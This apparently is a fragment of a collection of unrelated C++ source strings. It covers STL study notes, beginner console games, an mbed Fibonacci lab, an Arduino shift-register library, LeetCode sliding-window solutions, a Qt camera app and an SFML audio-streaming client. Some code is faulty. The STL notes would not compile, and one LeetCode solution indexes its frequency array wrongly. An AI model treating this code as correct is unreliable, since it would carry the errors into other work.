return vector if visited and not last in current return vector. */\n      if(floor_visited && ret.back() != i){\n        ret.push_back(i);\n      }\n    }\n  }\n  \n  //If we did not end at floor 0 push 0 to back\n  if(ret.back() > 0)\n    ret.push_back(0);\n  \n  return ret;\n}",
    "STL NOTES\r\n\r\n\r\nAlogrithms\r\nContainers\r\nFunctions\r\nIterators\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nvoid explainPair(){\r\n\r\n    pair<int, int> p = {1, 3};\r\n\r\n    cout << p.first << \" \" << p.second;\r\n\r\n    pair<int, pair<int, int> p = {1, {2, 3}};\r\n\r\n    cout << p.first << \" \" << p.second.first << \" \" << p.second.second;\r\n\r\n    pair<int, int> arr[] = { {1, 2}, {2, 3}, {4, 5}};\r\n\r\n    cout << arr[1].second;\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nvoid explainVector(){\r\n\r\n    vector<int> v;\r\n\r\n    v.push_back(1);\r\n    v.emplace_back(2);\r\n\r\n    vector<pair<int,int>> vec;\r\n\r\n    vec.push_back({1, 3});\r\n    vec.emplace_back(4, 5); // {} not required for emplace back\r\n\r\n    vector<int> v(5, 100); // {100, 100, 100, 100, 100}\r\n\r\n    vector<int> v(5);\r\n\r\n    vector<int> v1(5, 20);\r\n    vector<int> v2(v1);\r\n\r\n    // Access elements of vector\r\n    \r\n     vector<int>::iterator it = v.begin();\r\n     it++;\r\n     cout << *(it) << \" \";\r\n\r\n     it = it+2;\r\n     cout << *(it) << \" \";\r\n\r\n    vector<int>::iterator it = v.end(); // Points the address of last+1 element\r\n\r\n    vector<int>::iterator it = v.rend();\r\n\r\n    vector<int>::iterator it = v.rbegin();\r\n\r\n    \r\n    \r\n    cout << v[0] << \" \" << v.at(0);\r\n\r\n    cout << v.back() << \" \"; // Prints last element\r\n\r\n\r\n\r\n    for(vector<int>::iterator it = v.begin(); it < v.end(); it++)\r\n        cout << *(it) << \" \";\r\n\r\n    // Auto = automatically assigns the data type, auto a = 5 assigns a as int\r\n    for(auto it = v.begin(); it < v.end(); it++)\r\n        cout << *(it) << \" \";\r\n\r\n    // For each loop, it on v points the value not the address so no need of *(it)\r\n    for(auto it : v)\r\n        cout << it << \" \";\r\n\r\n    // Deletion\r\n    // {10, 20, 25, 30, 40}\r\n    v.erase(v.begin()+2); // {10, 20, 30, 40}\r\n    v.erase(v.begin() + 2, v.begin() + 4) // {10, 20, 40} (start, end+1)\r\n\r\n    // Insert Function\r\n    vector<int> v(2,100); // {100, 100}\r\n    v.insert(v.begin(), 300); // {300, 100, 100}\r\n    v.insert(v.begin() + 1, 2, 10); // {300, 10, 10, 100, 100} (position, no. of occurrence, value)\r\n\r\n    vector<int> copy(2, 50); // {50, 50}\r\n    v.insert(v.begin(), copy.begin(), copy.end()); // {50, 50, 300, 10, 10, 100, 100}\r\n\r\n    // Size {10, 20}\r\n    cout << v.size(); // 2\r\n\r\n    // PopBack {10, 20}\r\n    v.pop_back(); //{10}\r\n\r\n    // v1 -> {10, 20}\r\n    // v2 -> {30, 40}\r\n    v1.swap(v2); // v1 -> {30, 40}, v2 -> {10, 20}\r\n\r\n    v.clear() // Erases entire vector\r\n\r\n    cout << v.empty(); // Returns 1 if the vector is empty 0 if its non empty\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\nvoid explainList(){\r\n    list<int> ls;\r\n\r\n    ls.push_back(2); // {2}\r\n    ls.emplace_back(4); // {2, 4}\r\n\r\n    ls.push_front(5); // {5, 2, 4}\r\n    ls.emplace_front(7); //{7, 5, 2, 4}\r\n\r\n    ls.front(); // Access first element\r\n    ls.back(); // Access last element\r\n\r\n    ls.pop_front(); // Removes first element\r\n    ls.pop_back(); // Removes second element\r\n\r\n    // rest functions same as vector\r\n    // begin, end, rbegin, rend, clear, insert, size, swap\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nvoid explainDeque(){\r\n    deque<int> dq; \r\n    // Same as List\r\n    dq.push_back(2); // {2}\r\n    dq.emplace_back(4); // {2, 4}\r\n    dq.push_front(5); // {5, 2, 4}\r\n    dq.emplace_front(7); //{7, 5, 2, 4}\r\n\r\n    // Rest of functions same as vector\r\n    // front(), back(), pop_front(), pop_back() \r\n    // begin, end, rbegin, rend, clear, insert, size, swap\r\n    \r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n// LIFO = Last In First Out\r\nvoid explainStack(){\r\n    stack<int> st;\r\n    st.push(1); // {1}\r\n    st.push(2); // {2, 1}\r\n    st.push(3); // {3, 2, 1}\r\n    st.push(3); // {3, 3, 2, 1}\r\n    st.emplace(5); // {5, 3, 3, 2, 1}\r\n\r\n    cout << st.top(); // prints 5 ** st[0] is invalid, no index accessing **\r\n\r\n    st.pop(); // {3, 3, 2, 1}\r\n\r\n    cout << st.top(); // 3\r\n\r\n    cout << st.size(); // 4\r\n\r\n    cout << st.empty(); // 0\r\n\r\n    stack<int> st1, st2;\r\n    st1.swap(st2);\r\n\r\n    // ** No Front or Back Access **, push(), top(), pop() are main functions\r\n    // Cant access bottom elements directly\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n// FIFO = First In First Out\r\nvoid explainQueue(){\r\n    queue<int> q;\r\n    q.push(1); // {1}\r\n    q.push(2); // {1, 2}\r\n    q.emplace(4); // {1, 2, 4}\r\n\r\n    q.back() += 5; // 4+5\r\n    cout << q.back(); // prints 9 \r\n\r\n    // {1, 2, 9}\r\n    cout << q.front(); // prints 1\r\n\r\n    q.pop(); // {2, 9}\r\n\r\n    cout << q.front(); // prints 2\r\n\r\n    // stack -> top(),cant access bottom    queue -> front(), back()\r\n    // size(), swap(), empty() same as stack\r\n}\r\n\r\n\r\n\r\n\r\n\r\nvoid explainPQ(){\r\n    // Maximum Heap (Big one goes to top place)\r\n    priority_queue<int> pq;\r\n\r\n    pq.push(5); // {5}\r\n    pq.push(2); // {5, 2}\r\n    pq.push(8); // {8, 5, 2}\r\n    pq.emplace(10); // {10, 8, 5, 2}\r\n\r\n    cout << pq.top(); // prints 10\r\n\r\n    pq.pop(); // {8, 5, 2}\r\n\r\n    cout << pq.top(); // prints 8\r\n\r\n    // size(), swap(), empty() same as others\r\n\r\n    // Minimum Heap (Small one goes to top place)\r\n    priority_queue<int, vector<int>, greater<int>> pq;\r\n\r\n    pq.push(5); // {5}\r\n    pq.push(2); // {2, 5}\r\n    pq.push(8); // {2, 5, 8}\r\n    pq.e",
    "// All  the good things i posted in my repository into one thing\n// Github: https://github.com/MudiBro/Cpp-Examples\n// I might update this in the future, idk. \n\n\n#include <iostream>\n#include <chrono>\n#include <thread>\n#include <random>\n#include <stdlib.h> \n#include <cstdlib>\n\nusing namespace std;\nusing namespace std::chrono;\nint maxNumber;\nint selectedNumber;\nint guessedNumber;\nbool notAnswered = true;\nint trys = 0;\nstring bot;\nint players;\nchar place1 = ' '; \nchar place2 = ' '; \nchar place3 = ' '; \nchar place11 = ' '; \nchar place12 = ' '; \nchar place13 = ' '; \nchar place31 = ' '; \nchar place32 = ' '; \nchar place33 = ' ';\n\nchar player = 'x';\nint choice;\n\nint choices; int number; int product; bool forever = true;\nint doublenumber() {\n    return number * 2;\n}\nint triplenumber() {\n    return number * 3;\n}\nint doubleTriple() {\n    while (forever){\n        cout << \"                          |-----------------|\\n                          |Choose between:  | \\n                          |1: double        |\\n                          |2: triple        | \\n                          |3: end           |\\n                          |-----------------|\\n\";\n        cout << \"Choice: \";\n        cin >> choices;\n        cout << \"\\n\";\n        if (choices == 1) {\n            cout << \"Number: \";\n            cin >> number;\n            cout << \"\\n\";\n            cout << number << \" x \" << \"2\" << \" = \" << doublenumber() << \"\\n\";\n            cout << \"\\n\\n\";\n        } else if (choices == 2) {\n            cout << \"Number: \";\n            cin >> number;\n            cout << \"\\n\";\n            cout << number << \" x \" << \"3\" << \" = \" << triplenumber() << \"\\n\";\n            cout << \"\\n\\n\";\n        } else if (choices == 3) {\n            return 0;\n        }\n    }\n    \n}\n\nint guessnumbergame() {\n    trys = 1;\n    while (notAnswered) {\n        cout << \"\\n\\n\\nGuess the number: \"; cin >> guessedNumber;\n        if (guessedNumber == selectedNumber) {\n            notAnswered = false;\n        } else {\n            cout << \"Incorrect, try again!\";\n            trys++;\n        }\n    }\n    cout << \"Correct! Game ended. Took \" << trys << \" tries!\"; return 0;\n    \n}\n\nint guesnumber() {\n    cout << \"Enter the max number to generate for you to guess: \"; cin >> maxNumber;\n    \n    std::random_device dev;\n    std::mt19937 rng(dev());\n    std::uniform_int_distribution<std::mt19937::result_type> dist6(1,maxNumber); // distribution in range [1, maxNumber]\n    selectedNumber = dist6(rng);\n    guessnumbergame();\n    \n    return 0;\n    \n\n    \n}\n\nstring choiceToString(int choice) {\n    // This function is made by chatgpt as I was too lasy\n    if (choice == 1) return \"rock\";\n    if (choice == 2) return \"paper\";\n    if (choice == 3) return \"scissors\";\n    return \"unknown\";\n    // End of chatgpt code.\n}\n\nint rockpaper() {\n    cout << \"Select your choise (1: Rock, 2: Paper, 3: Sicors): \"; cin >> players;\n    if (players < 1 || players > 3) {\n        cout << \"Invalid choice. Please select 1, 2, or 3.\" << endl;\n        return 1; \n    }\n    // Searched on stackoverflow to find out how to generate a random number. https://stackoverflow.com/questions/13445688/how-to-generate-a-random-number-in-c\n    std::random_device dev;\n    std::mt19937 rng(dev());\n    std::uniform_int_distribution<std::mt19937::result_type> dist6(1,3); // distribution in range [1, 6]\n    // End of what i got from stack overflow.\n    int numberbot = dist6(rng);\n    if (numberbot == 1) {\n        bot = \"rock\";\n    } else if (numberbot == 2) {\n        bot = \"paper\";\n    } else if (numberbot == 3) {\n        bot = \"scissors\";\n    } else {\n        cout << \"ERROR: Bot chose something other than 1-3. Please try again, or fix the source code.\";\n    }\n    \n    // Below is coded by chatgpt as I was too lasy\n    // Display choices\n    cout << \"You chose: \" << choiceToString(players) << endl;\n    cout << \"Bot chose: \" << bot << endl;\n\n    // Determine the winner\n    if (players == numberbot) {\n        cout << \"It's a tie!\" << endl;\n    } else if ((players == 1 && numberbot == 3) || // Rock beats Scissors\n               (players == 2 && numberbot == 1) || // Paper beats Rock\n               (players == 3 && numberbot == 2)) { // Scissors beats Paper\n        cout << \"You win!\" << endl;\n    } else {\n        cout << \"Bot wins!\" << endl;\n    }\n    // End of chatgpt code\n    cout << \"\\n\\nCredits to:\\nhttps://github.com/MudiBro\\nhttps://stackoverflow.com/questions/13445688/how-to-generate-a-random-number-in-c \\nand a very small part of code from ChatGPT\";\n    return 0; // End application.\n}\n\n\nvoid plays() {\n    cout << \"\\nPlayer \" << player;\n    cout << \"\\nChoose where you want to go (Choices: 1, 2, 3, 11, 12, 13, 31, 32, 33): \";\n    cin >> choice;\n\n    if (choice == 1) {\n        if (place1 == 'o' || place1 == 'x'){\n            cout << \"Placed where someone already is, ending application\"; exit(0);\n        } else {\n            place1 = player;\n        }\n        \n    }\n    else if (choice == 2) {\n        if (place2 == 'o' || place2 ",
    "#include \"mbed.h\"\n\n/*\nLab 2: part of this lab we learned how to code a recursive funtion where by the function loops until\na defined number of loops are obtained. To demonstarte this a Fibonacci squence is simulated, the\nfirst intial interger and intial subsquent interger of the squence are defined, then addtional function is\nused to otain the next subsquent interger. The process is looped a set number of times, also defined.   \n*/\n\n/*\nThe next term is the sum of the previous two terms.\nThe first two terms of the Fibonacci sequence are 0 followed by 1.\n*/\n// main() runs in its own thread in the OS\n\nint t_1 = 0;\nint t_2 = 1;\nint next_term = 0;\n\nint max_terms = 10;\n\n\nint fib(int n){\n    // inp: position of the fib sequence\n    // out: the number in that sequence\n    if(n==0)\n        return 0;\n    if(n==1)\n        return 1;\n    else\n        return(fib(n-1) + fib(n-2));\n    }\n\nint main()\n{\n    printf(\"Finbonachi series loop: %d, %d, \", t_1, t_2);\n    for(int i=2; i<max_terms; i++){\n        next_term = t_1 + t_2;\n        printf(\"%d, \",next_term);\n        t_1 = t_2;\n        t_2 = next_term;\n    }\n    printf(\"\\r\\n\");\n\n    printf(\"Finbonachi series recursize: \");\n    for (int i=0;i<max_terms; i++){\n        printf(\"%d, \", fib(i));\n    }\n    printf(\"\\r\\n\");\n\n    while (true) {\n\n    }\n}\n\n",
    "#include \"Arduino.h\"\n#include \"ShiftRegister74HC595.h\"\n\n\n// constructor\nShiftRegister74HC595::ShiftRegister74HC595(int numberOfShiftRegisters, int serialDataPin, int clockPin, int latchPin)\n{\n    // set attributes\n    _numberOfShiftRegisters = numberOfShiftRegisters;\n    \n    _clockPin = clockPin;\n    _serialDataPin = serialDataPin;\n    _latchPin = latchPin;\n    \n    // define pins as outputs\n    pinMode(clockPin, OUTPUT);\n    pinMode(serialDataPin, OUTPUT);\n    pinMode(latchPin, OUTPUT);\n    \n    // set pins low\n    digitalWrite(clockPin, LOW);\n    digitalWrite(serialDataPin, LOW);\n    digitalWrite(latchPin, LOW);\n    \n    // allocates the specified number of bytes and initializes them to zero\n    _digitalValues = (uint8_t *)malloc(numberOfShiftRegisters * sizeof(uint8_t));\n    memset(_digitalValues, 0, numberOfShiftRegisters * sizeof(uint8_t));\n    \n    setAll(_digitalValues); // reset shift register\n}\n\n\nvoid ShiftRegister74HC595::setAll(uint8_t * digitalValues) {\n    int byte;\n    \n    for (byte = _numberOfShiftRegisters - 1; byte >= 0; byte--) {\n        shiftOut(_serialDataPin, _clockPin, MSBFIRST, digitalValues[byte]);\n    }\n    \n    _digitalValues = digitalValues; \n    \n    digitalWrite(_latchPin, HIGH); \n    digitalWrite(_latchPin, LOW); \n}\n\n\nuint8_t * ShiftRegister74HC595::getAll() {\n    return _digitalValues; \n}\n\n\nvoid ShiftRegister74HC595::set(int pin, uint8_t value) {\n    setNoUpdate(pin, value);\n    updateRegisters();\n}\n\nvoid ShiftRegister74HC595::updateRegisters()\n{\n\t setAll(_digitalValues);\n}\n\nvoid ShiftRegister74HC595::setNoUpdate(int pin, uint8_t value) {\n    if (value == 1)\n        _digitalValues[pin / 8] |= 1 << (pin % 8);\n    else\n        _digitalValues[pin / 8] &= ~(1 << (pin % 8));\n}\n\n\nuint8_t ShiftRegister74HC595::get(int pin) {\n    return (_digitalValues[pin / 8] >> (pin % 8)) & 1;\n}\n\n\nvoid ShiftRegister74HC595::setAllHigh() {\n    int i; \n    for (i = 0; i < _numberOfShiftRegisters; i++)\n        _digitalValues[i] = 255;\n    setAll(_digitalValues); \n}\n\n\nvoid ShiftRegister74HC595::setAllLow() {\n    int i; \n    for (i = 0; i < _numberOfShiftRegisters; i++)\n        _digitalValues[i] = 0; \n    setAll(_digitalValues); \n}\n",
    "#include \"product.h\"\n#include <iostream>\n\nusing namespace std;\n\nProduct::Product() {\n    _id = generateId();\n    _totalPurchase = 0;\n}\n\nProduct::Product(string name, int price, string category, string company) {\n    _id = generateId();\n    _name = name;\n    _price = price;\n    _category = category;\n    _company = company;\n    _totalPurchase = 0;\n}\n\nProduct::~Product() {\n\n}\n\nint Product::getId() {\n    return _id;\n}\n\nstring Product::getName() {\n    return _name;\n}\n\nint Product::getPrice() {\n    return _price;\n}\n\nstring Product::getCategory() {\n    return _category;\n}\n\nstring Product::getCompany() {\n    return _company;\n}\n\nint Product::getTotalPurchase() {\n    return _totalPurchase;\n}\n\nvoid Product::setId(int id) {\n    _id = id;\n}\n\nvoid Product::setName(string name) {\n    _name = name;\n}\n\nvoid Product::setCategory(string category) {\n    _category = category;\n}\n\nvoid Product::setCompany(string company) {\n    _company = company;\n}\n\nvoid Product::setTotalPurchase(int count) {\n    _totalPurchase = count;\n}\n\nvoid Product::increasePurchase() {\n    _totalPurchase += 1;\n}\n\nint Product::generateId() {\n    if (!isInit)\n        initSharedId();\n\n    _sharedId += 1;\n    return _sharedId;\n}\n\nvoid Product::initSharedId() {\n    _sharedId = 0;\n    isInit = true;\n}",
    "//121. Best Time to Buy and Sell Stock - https://leetcode.com/problems/best-time-to-buy-and-sell-stock/description/\r\nclass Solution {\r\npublic:\r\n    int maxProfit(vector<int>& prices) {\r\n        int l  = 0 , r = 1;\r\n        int mProfit = 0;\r\n        while(r < prices.size())\r\n        {\r\n            if(prices[l] < prices[r])\r\n            {\r\n                int profit = prices[r] - prices[l];\r\n                mProfit = max(profit,mProfit);\r\n            }\r\n            else\r\n                l = r;\r\n            r++;\r\n        }\r\n        return mProfit;\r\n    }\r\n};\r\n\r\n\r\n//3. Longest Substring Without Repeating Characters - https://leetcode.com/problems/longest-substring-without-repeating-characters/description/\r\nclass Solution {\r\npublic:\r\n    int lengthOfLongestSubstring(string s) {\r\n        int l = 0, r = 0;\r\n        int n = s.length();\r\n        int maxLength = 0;\r\n        unordered_map<char, int> m;\r\n        \r\n        while (r < n) {\r\n            if (m.find(s[r]) != m.end() && m[s[r]] >= l) {\r\n                l = m[s[r]] + 1;\r\n            }\r\n            maxLength = max(maxLength, r - l + 1);\r\n            m[s[r]] = r;\r\n            r++;\r\n        }\r\n        \r\n        return maxLength;\r\n    }\r\n};\r\n\r\n\r\n//424. Longest Repeating Character Replacement - https://leetcode.com/problems/longest-repeating-character-replacement/description/\r\nclass Solution {\r\npublic:\r\n    int characterReplacement(string s, int k) {\r\n        int left = 0 , right = 0, maxFrequency = 0, maxLen = 0;\r\n        int hash[26] = {0};\r\n        while(right < s.length())\r\n        {\r\n            hash[s[right] - 'A']++;\r\n            if(hash[s[right]] - 'A' > maxFrequency)\r\n            {\r\n                maxFrequency = max(maxFrequency,hash[s[right] - 'A']);\r\n            }\r\n            if((right - left + 1) - maxFrequency > k )\r\n            {\r\n                hash[s[left] - 'A']--;\r\n                left++;\r\n            }\r\n            maxLen = max(maxLen , right - left + 1);\r\n            right++;\r\n        }\r\n        return maxLen; \r\n    }\r\n};\r\n\r\n\r\n//567. Permutation in String - https://leetcode.com/problems/permutation-in-string/\r\nclass Solution {\r\npublic:\r\n    \r\n    // check the window has all the characters present the str1\r\n    \r\n    bool is_check(vector<int>& mp1, vector<int>& mp2)\r\n    {\r\n        for(int i = 0; i < 26; i++)\r\n        {\r\n            if(mp1[i] != mp2[i])\r\n                return false;\r\n        }\r\n        \r\n        return true;\r\n    }\r\n    \r\n    bool checkInclusion(string str1, string str2) {\r\n        \r\n        int n1 = str1.size();\r\n        \r\n        int n2 = str2.size();\r\n        \r\n        vector<int> mp1(26, 0);\r\n        \r\n        vector<int> mp2(26, 0);\r\n        \r\n        // store the count of all characters of str1 in mp1\r\n        \r\n        for(int i = 0; i < n1; i++)\r\n        {\r\n            mp1[str1[i] - 'a']++;\r\n        }\r\n        \r\n        // apply sliding window\r\n        \r\n        // here we can take n1 as the size of sliding window\r\n        \r\n        for(int i = 0; i < n2; i++)\r\n        {\r\n            if(i < n1)\r\n            {\r\n                mp2[str2[i]- 'a']++;\r\n            }\r\n            else\r\n            {\r\n                if(is_check(mp1, mp2))\r\n                    return true;\r\n                \r\n                mp2[str2[i - n1] - 'a']--;\r\n                \r\n                mp2[str2[i] - 'a']++;\r\n            }\r\n        }\r\n        \r\n        if(is_check(mp1, mp2))\r\n            return true;\r\n        \r\n        return false;\r\n    }\r\n};\r\n\r\n//76. Minimum Window Substring - https://leetcode.com/problems/minimum-window-substring/\r\nclass Solution {\r\npublic:\r\n    string minWindow(string s, string t) {\r\n        map<char, int> m;\r\n        for(char c : t) {\r\n            m[c]++;\r\n        }\r\n\r\n        int minLength = 1e9;\r\n        int cnt = 0;\r\n        int startPoint = 0;\r\n        int l = 0, r = 0;\r\n\r\n        while(r < s.length()) {\r\n            if(m[s[r]] > 0) {\r\n                cnt++;\r\n            }\r\n            m[s[r]]--; // Decrease the count for the character\r\n            r++;\r\n\r\n            while(cnt == t.length()) {\r\n                if(minLength > r - l) {\r\n                    minLength = r - l;\r\n                    startPoint = l;\r\n                }\r\n                \r\n                m[s[l]]++; // Restore the count of the left character\r\n                if(m[s[l]] > 0) {\r\n                    cnt--;\r\n                }\r\n                l++;\r\n            }\r\n        }\r\n\r\n        if(minLength == 1e9) return \"\"; // No valid window found\r\n        return s.substr(startPoint, minLength);\r\n    }\r\n};\r\n//239. Sliding Window Maximum - https://leetcode.com/problems/sliding-window-maximum/description/\r\nclass Solution {\r\npublic:\r\nvector<int> maxSlidingWindow(std::vector<int>& nums, int k) {\r\n        deque<int> q;\r\n        vector<int> ans;\r\n        for(int i = 0; i < nums.size(); i++)\r\n        {\r\n            if(!q.empty() && q.front() == i - k)q.pop_front();\r\n            while(!q.empty() && nums[q.back()] < nums[i])q.pop_back();\r\n            q.push_back(",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\n#include <QDebug>\n#include <QCoreApplication>\n#include <QFileDialog>\n#include <QVideoWidget>\n#include <QMediaPlayer>\n#include <QCameraImageCapture>\n#include <QTimer>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n\n{\n    ui->setupUi(this);\n\n\n    QPalette pal = ui->widget_Camera_View->palette();\n    pal.setColor(QPalette::Window, Qt::black);\n    ui->widget_color->setAutoFillBackground(true);\n    ui->widget_color->setPalette(pal);\n    ui->widget_color->show();\n    ui->widget_Camera_View->setAutoFillBackground(true);\n    ui->widget_Camera_View->setPalette(pal);\n    ui->widget_Camera_View->show();\n    ui->imageLabel->setVisible(false);\n    QPalette palette = ui->groupBox_Video->palette();\n    palette.setColor(QPalette::Window, Qt::black);\n    palette.setColor(ui->imageLabel->foregroundRole(), Qt::black);\n    ui->groupBox_Video->setAutoFillBackground(true);\n    ui->groupBox_Video->setPalette(palette);\n    ui->groupBox_Video->show();\n    ui->groupBox_Video->setVisible(true);\n    QPalette palett = ui->imageLabel->palette();\n    palett.setColor(QPalette::Window, Qt::black);\n    ui->imageLabel->setAutoFillBackground(true);\n    ui->imageLabel->setPalette(palett);\n\n\n\n    ui->horizontalSlider_Time->setEnabled(false);\n    ui->label_first_Minute->setEnabled(false);\n    ui->label_second_Minute->setEnabled(false);\n    ui->pushButton_video_start->setEnabled(false);\n    ui->pushButton_video_stop->setEnabled(false);\n    ui->pushButton_Image_Capture->setEnabled(false);\n    ui->pushButton_Start_Recording->setEnabled(false);\n    ui->pushButton_Stop_Recording->setEnabled(false);\n    ui->pushButton_Stop_Camera->setEnabled(false);\n    ui->pushButton_video_stop_2->setEnabled(false);\n    ui->pushButton_video_start->setIcon(style()->standardIcon(QStyle::SP_MediaPlay));\n    ui->pushButton_video_stop->setIcon(style()->standardIcon(QStyle::SP_MediaPause));\n    ui->pushButton_video_stop_2->setIcon(style()->standardIcon(QStyle::SP_MediaStop));\n\n    Player = new QMediaPlayer(this);\n    Video = new QVideoWidget();\n    Video = nullptr;\n\n\n    menuDevices = new QMenu(this);\n    populateCamerasMenu();\n    printApplicationDirPath();\n    printCurrentDirPath();\n\n    for (const QCameraInfo &infor : QCameraInfo::availableCameras()){\n        qDebug() << infor.description();\n        // clazy:skip=c++11-range-loop-detachlabel\n    }\n\n    M_Camera.reset(new QCamera(QCameraInfo::defaultCamera()));\n    M_Camera->setViewfinder(ui->widget_Camera_View);\n\n    connect(ui->pushButton_Image_Capture, &QPushButton::clicked, this, &MainWindow::on_pushButton_Image_Capture_clicked);\n    connect(ui->pushButton_Start_Camera, &QPushButton::clicked, this, &MainWindow::on_pushButton_Start_Camera_clicked);\n    connect(ui->pushButton_Stop_Camera, &QPushButton::clicked, this, &MainWindow::on_pushButton_Stop_Camera_clicked);\n    connect(ui->pushButton_Start_Recording, &QPushButton::clicked, this, &MainWindow::on_pushButton_Start_Recording_clicked);\n    connect(ui->pushButton_Stop_Recording, &QPushButton::clicked, this, &MainWindow::on_pushButton_Stop_Recording_clicked);\n    connect(ui->pushButton_video_start, &QPushButton::clicked, this, &MainWindow::on_pushButton_video_start_clicked);\n    connect(ui->pushButton_video_stop, &QPushButton::clicked, this, &MainWindow::on_pushButton_video_stop_clicked);\n    connect(ui->horizontalSlider_Time, &QSlider::valueChanged, this, &MainWindow::on_horizontalSlider_Time_valueChanged);\n    connect(ui->pushButton_Camera_Devices, &QPushButton::clicked, this, &MainWindow::on_pushButton_Camera_Devices_clicked);\n\n\n    if(M_Camera.data()->isCaptureModeSupported(QCamera::CaptureVideo))\n        M_Camera.data()->setCaptureMode(QCamera::CaptureVideo);\n    else\n        qFatal(\"Kamera Video Cekmeye Uygun Degil!!!\");\n\n\n}\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n\nvoid MainWindow::durationChanged(qint64 duration)\n{\n    mDuration= duration/1000;\n    ui->horizontalSlider_Time->setMaximum(mDuration);\n\n}\n\nvoid MainWindow::cleanup()\n{\n    if (M_Camera_Image) {\n        M_Camera_Image->cancelCapture();\n        M_Camera_Image.reset();\n    }\n\n    if (M_Media_Recorder) {\n        M_Media_Recorder->stop();\n        M_Media_Recorder.reset();\n    }\n\n    if (Video) {\n        Video->hide();\n        delete Video;\n        Video = nullptr;\n    }\n\n    Player->stop();\n}\n\nvoid MainWindow::positionChanged(qint64 duration)\n{\n    if(!ui->horizontalSlider_Time->isSliderDown())\n    {\n        ui->horizontalSlider_Time->setValue(duration/1000);\n    }\n    updateDuration(duration/1000);\n}\n\nvoid MainWindow::populateCamerasMenu()\n{\n    QList<QCameraInfo> cameras = QCameraInfo::availableCameras();\n\n    foreach (const QCameraInfo &cameraInfo, cameras) {\n        QAction *action = new QAction(cameraInfo.description(), this);\n        action->setData(cameraInfo.deviceName());\n        connect(action, &QAction::triggered, this, [=]() {\n            switchCamera(action);\n        })\n            ;\n\n  ",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Audio.hpp>\n#include <SFML/Network.hpp>\n#include <iostream>\n\n\nconst sf::Uint8 clientAudioData   = 1;\nconst sf::Uint8 clientEndOfStream = 2;\n\n\n////////////////////////////////////////////////////////////\n/// Specialization of audio recorder for sending recorded audio\n/// data through the network\n////////////////////////////////////////////////////////////\nclass NetworkRecorder : public sf::SoundRecorder\n{\npublic:\n\n    ////////////////////////////////////////////////////////////\n    /// Constructor\n    ///\n    /// \\param host Remote host to which send the recording data\n    /// \\param port Port of the remote host\n    ///\n    ////////////////////////////////////////////////////////////\n    NetworkRecorder(const sf::IpAddress& host, unsigned short port) :\n    m_host(host),\n    m_port(port)\n    {\n    }\n\n    ////////////////////////////////////////////////////////////\n    /// Destructor\n    ///\n    /// \\see SoundRecorder::~SoundRecorder()\n    ///\n    ////////////////////////////////////////////////////////////\n    ~NetworkRecorder()\n    {\n        // Make sure to stop the recording thread\n        stop();\n    }\n\nprivate:\n\n    ////////////////////////////////////////////////////////////\n    /// \\see SoundRecorder::onStart\n    ///\n    ////////////////////////////////////////////////////////////\n    virtual bool onStart()\n    {\n        if (m_socket.connect(m_host, m_port) == sf::Socket::Done)\n        {\n            std::cout << \"Connected to server \" << m_host << std::endl;\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n    }\n\n    ////////////////////////////////////////////////////////////\n    /// \\see SoundRecorder::onProcessSamples\n    ///\n    ////////////////////////////////////////////////////////////\n    virtual bool onProcessSamples(const sf::Int16* samples, std::size_t sampleCount)\n    {\n        // Pack the audio samples into a network packet\n        sf::Packet packet;\n        packet << clientAudioData;\n        packet.append(samples, sampleCount * sizeof(sf::Int16));\n\n        // Send the audio packet to the server\n        return m_socket.send(packet) == sf::Socket::Done;\n    }\n\n    ////////////////////////////////////////////////////////////\n    /// \\see SoundRecorder::onStop\n    ///\n    ////////////////////////////////////////////////////////////\n    virtual void onStop()\n    {\n        // Send a \"end-of-stream\" packet\n        sf::Packet packet;\n        packet << clientEndOfStream;\n        m_socket.send(packet);\n\n        // Close the socket\n        m_socket.disconnect();\n    }\n\n    ////////////////////////////////////////////////////////////\n    // Member data\n    ////////////////////////////////////////////////////////////\n    sf::IpAddress  m_host;   ///< Address of the remote host\n    unsigned short m_port;   ///< Remote port\n    sf::TcpSocket  m_socket; ///< Socket used to communicate with the server\n};\n\n\n////////////////////////////////////////////////////////////\n/// Create a client, connect it to a running server and\n/// start sending him audio data\n///\n////////////////////////////////////////////////////////////\nvoid doClient(unsigned short port)\n{\n    // Check that the device can capture audio\n    if (!sf::SoundRecorder::isAvailable())\n    {\n        std::cout << \"Sorry, audio capture is not supported by your system\" << std::endl;\n        return;\n    }\n\n    // Ask for server address\n    sf::IpAddress server;\n    do\n    {\n        std::cout << \"Type address or name of the server to connect to: \";\n        std::cin  >> server;\n    }\n    while (server == sf::IpAddress::None);\n\n    // Create an instance of our custom recorder\n    NetworkRecorder recorder(server, port);\n\n    // Wait for user input...\n    std::cin.ignore(10000, '\\n');\n    std::cout << \"Press enter to start recording audio\";\n    std::cin.ignore(10000, '\\n');\n\n    // Start capturing audio data\n    recorder.start(44100);\n    std::cout << \"Recording... press enter to stop\";\n    std::cin.ignore(10000, '\\n');\n    recorder.stop();\n}\n",
